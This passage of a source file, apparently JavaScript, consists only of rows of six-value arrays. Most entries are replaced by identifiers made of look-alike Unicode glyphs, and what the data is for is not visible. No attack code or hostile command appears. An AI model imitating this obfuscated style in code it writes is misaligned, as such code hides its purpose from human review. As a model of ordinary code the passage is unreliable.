			[ΔⲆⵠ, ⵠ[156], 0, 200, 28, ΔΔΔ],
			[1, ⵠ[156], 0, 193, 30, ⵠⲆΔ],
			[ΔⲆⵠ, ⵠ[156], 3, 196, 27, 1],
			[1, ⵠ[156], ᐃⲆᐃᐃ, 199, 30, ΔΔΔ],
			[1, ⵠ[156], 3, 197, 29, Ⲇᐃⵠ],
			[ΔⲆⵠ, ⵠ[156], 3, 195, 30, ΔΔΔ],
			[1, ⵠ[156], ⲆΔⵠⵠ, 197, 31, ⵠΔΔ],
			[1, ⵠ[156], ᐃⲆⵠᐃ, 201, 33, 1],
			[1, ⵠ[156], Ⲇᐃⵠᐃ, 202, 34, ᐃᐃⵠ],
			[ᐃᐃⵠ, ⵠ[156], 4, 202, 35, ΔⲆⵠ],
			[ⵠΔΔ, ⵠ[156], 4, 203, 36, 1],
			[ⵠΔΔ, ⵠ[156], 4, 204, 37, 1],
			[ΔⲆⵠ, ⵠ[156], 2, 205, 38, 1],
			[ᐃᐃⵠ, ⵠ[156], ᐃΔΔⲆ, 205, 39, ΔⲆⵠ],
			[1, ⵠ[156], 5, 205, 40, 1],
			[ᐃⲆᐃ, ⵠ[156], 2, 206, 41, 1],
			[1, ⵠ[156], 1, 207, 42, ΔⲆⵠ],
			[1, ⵠ[156], 1, 205, 41, 1],
			[ⵠⲆΔ, ⵠ[156], 4, 208, 43, 1],
			[ΔⲆⵠ, ⵠ[156], 4, 209, 43, 1],
			[ⵠΔᐃ, ⵠ[156], 1, 210, 43, 1],
			[1, ⵠ[156], ⵠⵠⵠΔ, 211, 43, ⵠΔΔ],
			[ⵠΔⲆ, ⵠ[156], 5, 212, 43, ᐃⲆᐃ],
			[Ⲇᐃⵠ, ⵠ[156], ⲆⵠΔⵠ, 213, 44, Ⲇᐃⵠ],
			[1, ⵠ[156], ⵠⵠⵠᐃ, 223, 54, ⵠΔΔ],
			[ΔⲆⵠ, ⵠ[156], ⲆᐃΔᐃ, 221, 53, ᐃᐃⵠ],
			[1, ⵠ[156], ⲆᐃΔᐃ, 219, 53, ᐃᐃⵠ],
			[1, ⵠ[156], ⵠΔᐃΔ, 218, 52, ΔΔΔ],
			[1, ⵠ[156], ᐃⵠⵠΔ, 217, 51, ⵠΔᐃ],
			[ⵠⲆΔ, ⵠ[156], Ⲇᐃⵠᐃ, 216, 51, ⵠΔᐃ],
			[1, ⵠ[156], 1, 215, 50, 1],
			[ᐃⲆᐃ, ⵠ[156], 4, 212, 46, 1],
			[ⵠΔᐃ, ⵠ[156], 1, 210, 44, ᐃᐃⵠ],
			[ⵠΔⲆ, ⵠ[156], ᐃᐃⲆⲆ, 206, 50, Ⲇᐃⵠ],
			[1, ⵠ[196], 0, 217, 24, ⵠΔᐃ],
			[ⵠⲆΔ, ⵠ[196], 0, 207, ⵠᐃⵠⵠⲆ, ⵠΔΔ],
			[1, ⵠ[348], 44, 54, ⵠⲆΔᐃᐃ, 0],
			[Ⲇᐃⵠ, ⵠ[348], 44, 53, 13, 0],
			[ⵠⲆΔ, ⵠ[348], 44, 51, ⵠᐃⵠⵠⲆ, ⲆΔⵠ],
			[ⵠΔΔ, ⵠ[348], 44, 49, ⲆⲆΔⵠᐃ, 0],
			[1, ⵠ[348], 44, 48, 14, 0],
			[1, ⵠ[348], 21, 78, 293, 0],
			[ᐃᐃⵠ, ⵠ[568], 0, 221, ⲆᐃΔⲆⵠ, ⵠΔΔ],
			[1, ⵠ[568], Δⵠᐃ, 224, 9, 1],
			[ⵠΔᐃ, ⵠ[568], 1, 223, 8, ⵠΔΔ],
			[1, ⵠ[568], 2, 224, ⲆᐃΔⲆⵠ, ⵠΔⲆ],
			[ⵠΔⲆ, ⵠ[568], 2, 222, 8, ⵠΔΔ],
			[ᐃⲆᐃ, ⵠ[568], ᐃΔΔ, 224, 6, 1],
			[ⵠⲆΔ, ⵠ[568], ᐃⵠΔ, 222, 5, 1],
			[1, ⵠ[568], 0, 219, ᐃΔⲆΔᐃ, 1],
			[ᐃⲆᐃ, ⵠ[568], 1, 220, ⵠⵠΔΔ, 1],
			[1, ⵠ[568], ᐃᐃⵠ, 217, 7, ΔⲆⵠ],
			[ⵠΔΔ, ⵠ[568], 2, 224, 5, 1],
			[ⵠΔᐃ, ⵠ[568], 2, 223, ⲆΔΔᐃ, ⵠⲆΔ],
			[1, ⵠ[568], 2, 224, ᐃΔⲆΔᐃ, 1],
			[Ⲇᐃⵠ, ⵠ[568], 2, 223, ᐃᐃᐃⵠᐃ, 1],
			[ⵠΔΔ, ⵠ[568], ⵠⵠΔⲆ, 223, 6, 1],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 222, ⵠᐃΔⵠⲆ, 1],
			[1, ⵠ[568], 2, 222, 7, ᐃⲆᐃ],
			[1, ⵠ[568], 2, 221, ᐃΔⲆΔᐃ, 1],
			[1, ⵠ[568], ᐃⲆΔⲆ, 221, ⵠΔⵠᐃⵠ, ⵠΔᐃ],
			[ᐃⲆᐃ, ⵠ[568], 2, 221, ΔⵠⲆⲆ, ⵠΔΔ],
			[ᐃⲆᐃ, ⵠ[568], ᐃⲆΔⲆ, 220, 6, 1],
			[ᐃⲆᐃ, ⵠ[568], ⲆᐃᐃⲆ, 220, ᐃⲆⲆᐃᐃ, 1],
			[ΔΔΔ, ⵠ[568], 2, 220, ΔᐃᐃⲆᐃ, 1],
			[1, ⵠ[568], 2, 219, 8, 1],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 219, ⵠΔⵠᐃⵠ, Ⲇᐃⵠ],
			[ⵠⲆΔ, ⵠ[568], 2, 219, ΔΔᐃⲆ, 1],
			[ᐃⲆᐃ, ⵠ[568], 0, 218, 5, ᐃᐃⵠ],
			[1, ⵠ[568], 0, 216, ⵠⵠⲆⵠΔ, ᐃⲆᐃ],
			[1, ⵠ[568], ΔⵠᐃⲆ, 218, Δᐃⵠⵠⵠ, ᐃⲆᐃ],
			[1, ⵠ[568], 2, 217, ⲆᐃΔⲆⵠ, ᐃᐃⵠ],
			[Ⲇᐃⵠ, ⵠ[568], 2, 218, 7, 1],
			[ⵠΔᐃ, ⵠ[568], 2, 218, ⵠᐃΔⵠⲆ, ΔⲆⵠ],
			[ⵠΔΔ, ⵠ[568], ⲆᐃᐃⲆ, 217, ⵠᐃΔⵠᐃ, Ⲇᐃⵠ],
			[1, ⵠ[568], ⲆⲆΔᐃ, 217, 5, 1],
			[ⵠⲆΔ, ⵠ[568], ᐃᐃⵠ, 215, 6, 1],
			[1, ⵠ[568], ΔΔΔ, 213, 5, 1],
			[ᐃᐃⵠ, ⵠ[568], 0, 214, ⲆΔᐃΔⵠ, 1],
			[1, ⵠ[568], ΔⲆⲆ, 216, 5, ᐃᐃⵠ],
			[ΔΔΔ, ⵠ[568], ᐃⵠⲆ, 213, 8, Ⲇᐃⵠ],
			[1, ⵠ[568], ᐃⵠΔ, 211, ᐃΔⲆΔᐃ, ΔΔΔ],
			[ΔΔΔ, ⵠ[568], ΔⲆⲆ, 209, ᐃΔΔⲆ, Ⲇᐃⵠ],
			[ᐃⲆᐃ, ⵠ[568], Δⵠᐃ, 208, 7, 1],
			[ᐃᐃⵠ, ⵠ[568], ⲆΔⵠ, 207, 8, 1],
			[ⵠΔⲆ, ⵠ[568], 2, 216, ⵠᐃᐃΔ, 1],
			[1, ⵠ[568], ΔⵠᐃⲆ, 216, ᐃⵠⵠⵠΔ, 1],
			[Ⲇᐃⵠ, ⵠ[568], 2, 215, ᐃⵠⵠⵠΔ, 1],
			[ᐃⲆᐃ, ⵠ[568], 2, 215, ΔᐃΔⲆⲆ, ⵠⲆΔ],
			[1, ⵠ[568], ΔⵠᐃⲆ, 214, 8, 1],
			[ⵠⲆΔ, ⵠ[568], ⵠⵠⵠΔ, 214, ΔⲆΔᐃᐃ, 1],
			[ⵠΔΔ, ⵠ[568], 2, 215, ⵠⵠΔΔ, ⵠΔⲆ],
			[ⵠΔᐃ, ⵠ[568], 2, 214, 5, 1],
			[1, ⵠ[568], 2, 213, 6, 1],
			[1, ⵠ[568], 2, 213, 7, 1],
			[ΔΔΔ, ⵠ[568], 2, 212, ᐃⲆⲆᐃᐃ, 1],
			[ᐃᐃⵠ, ⵠ[568], ΔΔΔ, 211, 5, ΔⲆⵠ],
			[1, ⵠ[568], 1, 209, 8, Ⲇᐃⵠ],
			[Ⲇᐃⵠ, ⵠ[568], ⲆᐃᐃⲆ, 212, 8, ΔΔΔ],
			[1, ⵠ[568], 2, 211, ⲆⲆᐃⵠΔ, ᐃᐃⵠ],
			[ΔΔΔ, ⵠ[568], 2, 210, ⲆⲆᐃⵠΔ, ᐃᐃⵠ],
			[1, ⵠ[568], 2, 209, ᐃⵠⵠⵠΔ, ⵠΔΔ],
			[1, ⵠ[568], ᐃⲆΔⲆ, 210, ΔⲆΔᐃᐃ, 1],
			[1, ⵠ[568], 2, 210, 6, ᐃᐃⵠ],
			[Ⲇᐃⵠ, ⵠ[568], 2, 212, ⲆΔᐃΔⵠ, 1],
			[1, ⵠ[568], 2, 212, ᐃⲆⵠⵠ, ᐃⲆᐃ],
			[ᐃᐃⵠ, ⵠ[568], 2, 211, ⵠᐃΔⵠⲆ, ⵠⲆΔ],
			[ΔⲆⵠ, ⵠ[568], 2, 210, ⵠⵠΔΔ, ᐃᐃⵠ],
			[1, ⵠ[568], ᐃⲆΔⲆ, 209, 6, ᐃᐃⵠ],
			[ᐃⲆᐃ, ⵠ[568], 2, 208, 6, ⵠⲆΔ],
			[1, ⵠ[568], 2, 208, 5, 1],
			[1, ⵠ[568], ΔⵠᐃⲆ, 207, 7, 1],
			[ᐃᐃⵠ, ⵠ[568], 2, 207, 6, 1],
			[ⵠΔⲆ, ⵠ[568], 2, 207, ⵠⵠΔΔ, ᐃᐃⵠ],
			[1, ⵠ[568], 2, 206, ⵠᐃΔⵠ, ⵠΔΔ],
			[ΔΔΔ, ⵠ[568], ⵠⵠΔⲆ, 208, ᐃⵠⲆᐃᐃ, Ⲇᐃⵠ],
			[1, ⵠ[568], ⵠⵠⵠΔ, 206, ⲆΔᐃΔⵠ, ΔΔΔ],
			[1, ⵠ[568], 0, 204, 8, 1],
			[ΔⲆⵠ, ⵠ[568], ΔΔⵠ, 205, 6, Ⲇᐃⵠ],
			[1, ⵠ[568], ᐃⵠΔ, 203, 5, 1],
			[1, ⵠ[568], ᐃⵠΔ, 202, ⲆᐃᐃᐃΔ, 1],
			[1, ⵠ[568], ΔⲆⲆ, 199, 8, 1],
			[1, ⵠ[568], 0, 200, 6, ⵠΔΔ],
			[Ⲇᐃⵠ, ⵠ[568], ⵠⲆⲆ, 197, 6, ΔⲆⵠ],
			[Ⲇᐃⵠ, ⵠ[568], 0, 195, Δᐃⵠⵠⵠ, 1],
			[1, ⵠ[568], ᐃⵠΔ, 194, 6, ⵠΔΔ],
			[1, ⵠ[568], ⵠⲆΔ, 202, 8, ΔⲆⵠ],
			[1, ⵠ[568], ⵠΔⲆ, 206, 7, ⵠΔΔ],
			[ΔΔΔ, ⵠ[568], 1, 201, 5, ΔⲆⵠ],
			[1, ⵠ[568], ΔΔΔ, 197, ⲆⲆᐃⵠΔ, ᐃᐃⵠ],
			[ⵠΔⲆ, ⵠ[568], ⵠⲆΔ, 192, ⵠΔᐃⵠⵠ, 1],
			[ΔΔΔ, ⵠ[568], 1, 195, ᐃΔΔⲆ, 1],
			[ⵠΔⲆ, ⵠ[568], ⵠⵠΔⲆ, 205, ⵠΔᐃⵠⵠ, 1],
			[1, ⵠ[568], 2, 205, 8, 1],
			[1, ⵠ[568], 2, 206, Δᐃⵠⵠⵠ, ΔΔΔ],
			[1, ⵠ[568], ⲆⲆΔᐃ, 204, ᐃⵠⵠᐃᐃ, 1],
			[ᐃⲆᐃ, ⵠ[568], ⲆᐃᐃⲆ, 204, 6, ⵠΔΔ],
			[1, ⵠ[568], ⲆⲆΔᐃ, 204, ⵠᐃΔⵠ, 1],
			[ⵠΔⲆ, ⵠ[568], ᐃⲆΔⲆ, 205, 5, ⵠΔⲆ],
			[ⵠΔⲆ, ⵠ[568], 2, 203, 6, ⵠΔⲆ],
			[1, ⵠ[568], 2, 203, 7, ᐃⲆᐃ],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 203, 8, 1],
			[ⵠΔⲆ, ⵠ[568], ⲆᐃᐃⲆ, 201, ⲆᐃΔⲆⵠ, 1],
			[1, ⵠ[568], 2, 200, 8, 1],
			[ΔⲆⵠ, ⵠ[568], 2, 200, ⵠΔᐃⵠⵠ, ᐃⲆᐃ],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 201, 7, ᐃⲆᐃ],
			[1, ⵠ[568], 2, 201, ⵠᐃΔⵠⲆ, ᐃⲆᐃ],
			[1, ⵠ[568], ᐃⲆΔⲆ, 202, 5, 1],
			[1, ⵠ[568], 2, 202, ᐃⲆⲆⲆ, 1],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 200, 5, 1],
			[ᐃⲆᐃ, ⵠ[568], 2, 199, 5, 1],
			[ⵠΔⲆ, ⵠ[568], ᐃⲆΔⲆ, 197, 5, ᐃᐃⵠ],
			[ⵠΔΔ, ⵠ[568], 2, 196, ⵠᐃΔⵠ, Ⲇᐃⵠ],
			[ᐃⲆᐃ, ⵠ[568], 2, 198, 5, ᐃᐃⵠ],
			[ᐃⲆᐃ, ⵠ[568], ⵠⵠⵠΔ, 198, 6, 1],
			[ⵠΔΔ, ⵠ[568], 2, 199, 6, 1],
			[1, ⵠ[568], ⵠⵠⵠΔ, 199, 7, ΔⲆⵠ],
			[1, ⵠ[568], ⲆⲆΔᐃ, 198, ᐃᐃᐃⵠᐃ, 1],
			[ΔⲆⵠ, ⵠ[568], ᐃⲆⵠᐃ, 198, 8, 1],
			[ΔΔΔ, ⵠ[568], ⵠⵠΔⲆ, 197, ᐃⲆⲆᐃᐃ, ΔⲆⵠ],
			[ΔΔΔ, ⵠ[568], ᐃⲆⵠᐃ, 196, ᐃᐃᐃⵠᐃ, ΔⲆⵠ],
			[ⵠΔΔ, ⵠ[568], ⵠⵠⵠΔ, 196, 8, 1],
			[ᐃᐃⵠ, ⵠ[568], ⵠⵠⵠΔ, 196, ᐃⲆⲆⲆ, 1],
			[ᐃᐃⵠ, ⵠ[568], ᐃⲆΔⲆ, 195, ⵠΔⵠᐃⵠ, 1],
			[ᐃⲆᐃ, ⵠ[568], ⲆⲆΔᐃ, 195, ᐃⲆⲆᐃᐃ, 1],
			[ΔΔΔ, ⵠ[568], 2, 194, ΔⲆΔᐃᐃ, ⵠⲆΔ],
			[1, ⵠ[568], ⵠⵠΔⲆ, 193, 8, 1],
			[1, ⵠ[568], ⵠⵠⵠΔ, 194, ᐃⵠⲆᐃᐃ, ⵠΔΔ],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 193, 7, ᐃⲆᐃ],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 193, 6, 1],
			[ᐃᐃⵠ, ⵠ[568], ⵠⵠΔⲆ, 193, ⵠⵠΔΔ, ᐃⲆᐃ],
			[1, ⵠ[568], 2, 194, ⵠⵠΔΔ, ⵠⲆΔ],
			[1, ⵠ[568], 0, 192, 5, ⵠΔΔ],
			[1, ⵠ[568], 0, 191, 8, 1],
			[1, ⵠ[568], ⵠⲆⲆ, 190, ⵠᐃᐃΔ, ⵠⲆΔ],
			[ΔⲆⵠ, ⵠ[568], 0, 188, ΔⲆΔᐃᐃ, ⵠΔⲆ],
			[1, ⵠ[568], Δⵠᐃ, 186, ⵠⵠⲆⵠΔ, 1],
			[Ⲇᐃⵠ, ⵠ[568], ⵠⲆⲆ, 186, ᐃⲆⵠⵠ, ⵠΔᐃ],
			[ΔⲆⵠ, ⵠ[568], ⵠⲆⲆ, 184, ᐃⲆⲆᐃᐃ, ⵠⲆΔ],
			[1, ⵠ[568], 0, 182, 8, 1],
			[1, ⵠ[568], 0, 181, ⵠⵠⵠⲆⲆ, ᐃⲆᐃ],
			[ⵠΔⲆ, ⵠ[568], 1, 189, 8, 1],
			[1, ⵠ[568], 1, 183, Δᐃⵠⵠⵠ, 1],
			[ⵠΔⲆ, ⵠ[568], 1, 188, 5, 1],
			[1, ⵠ[568], 1, 185, 6, ΔΔΔ],
			[ΔΔΔ, ⵠ[568], 1, 180, ᐃᐃᐃⵠᐃ, ⵠⲆΔ],
			[ⵠΔⲆ, ⵠ[568], 1, 183, 5, ᐃⲆᐃ],
			[1, ⵠ[568], 1, 178, ΔᐃΔⲆⲆ, 1],
			[1, ⵠ[568], ᐃⲆᐃ, 177, ΔᐃⲆᐃ, ΔⲆⵠ],
			[ᐃⲆᐃ, ⵠ[568], 1, 173, ΔⲆΔᐃᐃ, ⵠΔΔ],
			[1, ⵠ[568], ⵠΔᐃ, 171, ᐃⵠⵠᐃᐃ, ⵠⲆΔ],
			[ⵠⲆΔ, ⵠ[568], 0, 177, ⲆⲆᐃⵠΔ, 1],
			[1, ⵠ[568], ᐃΔΔ, 175, 7, ⵠⲆΔ],
			[Ⲇᐃⵠ, ⵠ[568], ᐃΔΔ, 179, ΔⵠⲆⲆ, ᐃᐃⵠ],
			[1, ⵠ[568], ᐃⵠⲆ, 174, ⲆΔΔᐃ, ᐃᐃⵠ],
			[1, ⵠ[568], ᐃⵠⲆ, 176, 5, 1],
			[ΔⲆⵠ, ⵠ[568], ⵠⲆⲆ, 172, 8, 1],
			[ᐃᐃⵠ, ⵠ[568], ᐃⵠΔ, 170, 8, ⵠΔᐃ],
			[ΔΔΔ, ⵠ[568], 0, 169, ⲆᐃⲆᐃ, 1],
			[1, ⵠ[568], ΔⵠᐃⲆ, 192, ⵠᐃΔⵠⲆ, Ⲇᐃⵠ],
			[ⵠΔⲆ, ⵠ[568], 2, 192, ⵠⵠⲆⵠΔ, ΔΔΔ],
			[1, ⵠ[568], ⵠⵠⵠΔ, 191, 7, 1],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 191, ⵠᐃΔⵠᐃ, ΔΔΔ],
			[1, ⵠ[568], ⵠⵠⵠΔ, 191, ⵠⵠΔΔ, ⵠⲆΔ],
			[1, ⵠ[568], 2, 190, 5, ᐃᐃⵠ],
			[ΔΔΔ, ⵠ[568], 2, 189, ᐃⲆⵠⵠ, 1],
			[ΔΔΔ, ⵠ[568], 2, 189, 6, 1],
			[ΔΔΔ, ⵠ[568], ⲆᐃᐃⲆ, 189, ᐃⵠⵠⵠΔ, 1],
			[1, ⵠ[568], ⵠⵠⵠΔ, 190, 7, ⵠΔⲆ],
			[ΔⲆⵠ, ⵠ[568], ⲆⲆΔᐃ, 190, ᐃⵠⲆᐃᐃ, ⵠⲆΔ],
			[1, ⵠ[568], 2, 188, 8, ΔⲆⵠ],
			[ΔⲆⵠ, ⵠ[568], ⲆᐃᐃⲆ, 187, ᐃⵠⲆᐃᐃ, 1],
			[ᐃⲆᐃ, ⵠ[568], ΔⵠᐃⲆ, 187, 7, ⵠΔΔ],
			[1, ⵠ[568], ⲆⲆΔᐃ, 187, ⵠΔⵠᐃⵠ, ᐃᐃⵠ],
			[ᐃᐃⵠ, ⵠ[568], ᐃⲆΔⲆ, 188, ⵠΔᐃΔⲆ, Ⲇᐃⵠ],
			[ΔΔΔ, ⵠ[568], 2, 187, ⵠⵠΔΔ, 1],
			[1, ⵠ[568], 2, 186, ⵠΔⵠᐃⵠ, ΔⲆⵠ],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 186, 7, 1],
			[Ⲇᐃⵠ, ⵠ[568], 2, 185, 7, 1],
			[ᐃⲆᐃ, ⵠ[568], ⲆⲆΔᐃ, 185, ⵠⵠⲆⵠΔ, 1],
			[ᐃⲆᐃ, ⵠ[568], ᐃⲆⵠᐃ, 184, ⲆᐃΔⲆⵠ, ΔΔΔ],
			[ΔⲆⵠ, ⵠ[568], ⵠⵠⵠΔ, 183, 7, ΔΔΔ],
			[ᐃᐃⵠ, ⵠ[568], ⵠⵠΔⲆ, 183, 6, Ⲇᐃⵠ],
			[1, ⵠ[568], 2, 184, ᐃⲆⲆⲆ, ⵠΔΔ],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 184, 5, 1],
			[1, ⵠ[568], 2, 185, 5, ⵠΔᐃ],
			[1, ⵠ[568], 2, 182, 6, 1],
			[ΔΔΔ, ⵠ[568], 2, 182, 7, ⵠΔⲆ],
			[1, ⵠ[568], 2, 181, ΔⲆΔᐃᐃ, 1],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 181, 8, 1],
			[ⵠΔⲆ, ⵠ[568], 2, 180, 8, ᐃⲆᐃ],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 179, 8, 1],
			[ΔⲆⵠ, ⵠ[568], ᐃⲆΔⲆ, 182, 5, 1],
			[ΔⲆⵠ, ⵠ[568], 2, 181, ⲆΔΔᐃ, Ⲇᐃⵠ],
			[1, ⵠ[568], ΔⵠᐃⲆ, 180, ΔⵠⲆⲆ, 1],
			[ⵠⲆΔ, ⵠ[568], 2, 180, ⵠⵠⵠⲆⲆ, 1],
			[1, ⵠ[568], 2, 179, 6, 1],
			[1, ⵠ[568], 2, 179, ΔⲆΔᐃᐃ, Ⲇᐃⵠ],
			[1, ⵠ[568], ⵠⵠⵠΔ, 178, 7, 1],
			[ⵠⲆΔ, ⵠ[568], 2, 178, 6, ΔΔΔ],
			[1, ⵠ[568], 2, 178, 5, ΔⲆⵠ],
			[1, ⵠ[568], 2, 177, 5, 1],
			[ⵠΔⲆ, ⵠ[568], ᐃⲆⵠᐃ, 177, ⲆᐃᐃᐃΔ, ⵠΔⲆ],
			[ᐃⲆᐃ, ⵠ[568], ⲆⲆΔᐃ, 176, ⲆᐃᐃᐃΔ, ⵠΔΔ],
			[ΔΔΔ, ⵠ[568], ⵠⵠΔⲆ, 176, 6, 1],
			[1, ⵠ[568], ᐃⲆΔⲆ, 175, ΔᐃⲆᐃ, 1],
			[1, ⵠ[568], 2, 175, 5, 1],
			[1, ⵠ[568], ⲆⲆΔᐃ, 176, ⲆⲆᐃⵠΔ, ΔΔΔ],
			[Ⲇᐃⵠ, ⵠ[568], 2, 174, 8, 1],
			[Ⲇᐃⵠ, ⵠ[568], ⵠⵠΔⲆ, 175, 8, ⵠⲆΔ],
			[ⵠⲆΔ, ⵠ[568], ΔⵠᐃⲆ, 173, ΔᐃᐃⲆᐃ, 1],
			[1, ⵠ[568], ᐃⲆΔⲆ, 174, ⲆᐃᐃᐃΔ, 1],
			[ΔΔΔ, ⵠ[568], 2, 173, 6, 1],
			[1, ⵠ[568], 2, 174, ᐃⲆⲆⲆ, ⵠⲆΔ],
			[1, ⵠ[568], 2, 172, ᐃΔΔΔ, ⵠⲆΔ],
			[1, ⵠ[568], ᐃⲆΔⲆ, 173, ΔΔᐃⲆ, 1],
			[1, ⵠ[568], ᐃⲆΔⲆ, 172, ⵠⵠⵠⲆⲆ, 1],
			[1, ⵠ[568], 2, 172, 7, 1],
			[1, ⵠ[568], ᐃⲆⵠᐃ, 171, ΔᐃΔⲆⲆ, ΔΔΔ],
			[ᐃⲆᐃ, ⵠ[568], ᐃⲆΔⲆ, 170, 7, 1],
			[Ⲇᐃⵠ, ⵠ[568], ⵠⵠⵠΔ, 170, ⵠΔᐃΔⲆ, ⵠⲆΔ],
			[ΔΔΔ, ⵠ[568], 2, 170, 5, 1],
			[1, ⵠ[568], ᐃⲆΔⲆ, 171, ΔΔᐃⲆ, ΔΔΔ],
			[Ⲇᐃⵠ, ⵠ[568], ᐃⲆⵠᐃ, 171, 6, Ⲇᐃⵠ],
			[1, ⵠ[568], ⲆⲆΔᐃ, 169, 5, ᐃᐃⵠ],
			[ᐃⲆᐃ, ⵠ[568], ᐃⲆⵠᐃ, 169, 7, 1],
			[1, ⵠ[568], 2, 169, ᐃⵠⲆᐃᐃ, 1],
			[ᐃⲆᐃ, ⵠ[568], 1, 168, ᐃⵠⵠᐃᐃ, ᐃᐃⵠ],
			[1, ⵠ[568], ⵠΔΔ, 166, ᐃⲆⵠⵠ, 1],
			[Ⲇᐃⵠ, ⵠ[568], Ⲇᐃⵠ, 164, 7, ⵠΔΔ],
			[ⵠΔⲆ, ⵠ[568], 1, 160, ᐃⵠⵠⵠΔ, 1],
			[ᐃᐃⵠ, ⵠ[568], ⵠΔΔ, 156, 8, ⵠΔᐃ],
			[1, ⵠ[568], Δⵠᐃ, 166, 8, 1],
			[ⵠΔΔ, ⵠ[568], 0, 168, ΔⵠⲆⲆ, ΔⲆⵠ],
			[ⵠⲆΔ, ⵠ[568], ᐃΔΔ, 164, ⲆᐃⲆᐃ, ⵠⲆΔ],
			[ΔΔΔ, ⵠ[568], 0, 162, 7, ⵠΔᐃ],
			[ᐃᐃⵠ, ⵠ[568], 0, 158, 8, ⵠΔΔ],
			[ⵠΔᐃ, ⵠ[568], ΔΔⵠ, 157, ⵠΔᐃΔⲆ, ⵠΔⲆ],
			[ⵠΔᐃ, ⵠ[568], Δⵠᐃ, 161, ⵠᐃΔⵠ, ᐃᐃⵠ],
			[1, ⵠ[568], Δⵠᐃ, 159, ᐃⲆⵠⵠ, ᐃⲆᐃ],
			[ⵠⲆΔ, ⵠ[568], Δⵠᐃ, 155, ᐃᐃᐃⵠᐃ, ⵠⲆΔ],
			[1, ⵠ[568], ΔⲆⲆ, 154, ⵠⵠΔΔ, ᐃⲆᐃ],
			[1, ⵠ[568], 0, 151, 7, ᐃⲆᐃ],
			[1, ⵠ[568], 1, 153, ΔᐃΔⲆⲆ, ᐃᐃⵠ],
			[ⵠΔⲆ, ⵠ[568], 1, 151, ⵠᐃΔⵠ, 1],
			[1, ⵠ[568], ⵠⵠⵠΔ, 168, 6, ⵠΔⲆ],
			[1, ⵠ[568], ⵠⵠⵠΔ, 168, ᐃⵠⲆᐃᐃ, ΔⲆⵠ],
			[ⵠΔᐃ, ⵠ[568], ⵠⵠΔⲆ, 167, Δᐃⵠⵠⵠ, ΔⲆⵠ],
			[ⵠΔⲆ, ⵠ[568], ᐃⲆΔⲆ, 167, ᐃⵠⵠⵠΔ, 1],
			[Ⲇᐃⵠ, ⵠ[568], ⲆᐃᐃⲆ, 167, 6, ᐃⲆᐃ],
			[1, ⵠ[568], ᐃⲆΔⲆ, 167, 5, ⵠΔⲆ],
			[ⵠⲆΔ, ⵠ[568], 2, 166, ⵠᐃΔⵠⲆ, 1],
			[ⵠΔⲆ, ⵠ[568], ΔⵠᐃⲆ, 166, ᐃᐃᐃⵠᐃ, 1],
			[1, ⵠ[568], ⵠⵠⵠΔ, 165, ᐃⵠⵠᐃᐃ, ⵠⲆΔ],
			[Ⲇᐃⵠ, ⵠ[568], 2, 165, 6, 1],
			[1, ⵠ[568], 2, 165, ΔΔᐃⲆ, 1],
			[ⵠΔⲆ, ⵠ[568], ᐃⲆⵠᐃ, 164, 5, 1],
			[1, ⵠ[568], 2, 163, ΔΔᐃⲆ, 1],
			[1, ⵠ[568], 2, 162, ⵠᐃΔⵠ, 1],
			[1, ⵠ[568], ⵠⵠΔⲆ, 162, ⵠΔᐃΔⲆ, ⵠΔᐃ],
			[ⵠΔΔ, ⵠ[568], 2, 163, ⵠᐃΔⵠᐃ, 1],
			[ⵠΔΔ, ⵠ[568], ⲆⲆΔᐃ, 163, ⲆᐃᐃᐃΔ, Ⲇᐃⵠ],
			[ⵠΔⲆ, ⵠ[568], 2, 163, ⵠⵠⲆⵠΔ, 1],
			[1, ⵠ[568], ⵠⵠⵠΔ, 164, Δᐃⵠⵠⵠ, ΔΔΔ],
			[ΔⲆⵠ, ⵠ[568], ⵠⵠΔⲆ, 165, ΔᐃΔⲆⲆ, 1],
			[ΔΔΔ, ⵠ[568], ⵠⵠⵠΔ, 161, 8, ᐃᐃⵠ],
			[Ⲇᐃⵠ, ⵠ[568], 2, 162, 8, ⵠⲆΔ],
			[ⵠΔⲆ, ⵠ[568], ⵠⵠΔⲆ, 160, ⲆᐃΔⲆⵠ, ᐃⲆᐃ],
			[1, ⵠ[568], 2, 159, ⲆᐃΔⲆⵠ, 1],
			[1, ⵠ[568], ⵠⵠⵠΔ, 159, ᐃⵠⵠⵠΔ, 1],
			[Ⲇᐃⵠ, ⵠ[568], ⲆⲆΔᐃ, 159, 6, 1],
			[ⵠΔⲆ, ⵠ[568], ᐃⲆⵠᐃ, 160, 5, ⵠΔᐃ],
			[1, ⵠ[568], 2, 160, 6, 1],
			[ΔⲆⵠ, ⵠ[568], ⲆᐃᐃⲆ, 161, ΔᐃⲆᐃ, 1],
			[1, ⵠ[568], 2, 161, 7, ᐃⲆᐃ],
			[ΔΔΔ, ⵠ[568], 2, 157, ᐃⵠⵠᐃᐃ, 1],
			[ⵠⲆΔ, ⵠ[568], 2, 158, ᐃᐃᐃⵠᐃ, 1],
			[1, ⵠ[568], 2, 158, 6, Ⲇᐃⵠ],
			[1, ⵠ[568], ΔⵠᐃⲆ, 158, ΔΔᐃⲆ, Ⲇᐃⵠ],
			[ⵠΔⲆ, ⵠ[568], 2, 155, ⲆΔΔᐃ, 1],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 155, ⲆΔᐃΔⵠ, 1],
			[ΔΔΔ, ⵠ[568], ⵠⵠΔⲆ, 156, ⵠᐃᐃΔ, 1],
			[1, ⵠ[568], ⲆᐃᐃⲆ, 156, 7, 1],
			[1, ⵠ[568], ΔⵠᐃⲆ, 157, ΔᐃΔⲆⲆ, 1],
			[ᐃⲆᐃ, ⵠ[568], ⲆᐃᐃⲆ, 155, ΔᐃᐃⲆᐃ, ⵠⲆΔ],
			[ᐃⲆᐃ, ⵠ[568], ⵠⵠⵠΔ, 154, ᐃⵠⲆᐃᐃ, ⵠΔΔ],
			[1, ⵠ[568], 2, 154, 7, ⵠΔΔ],
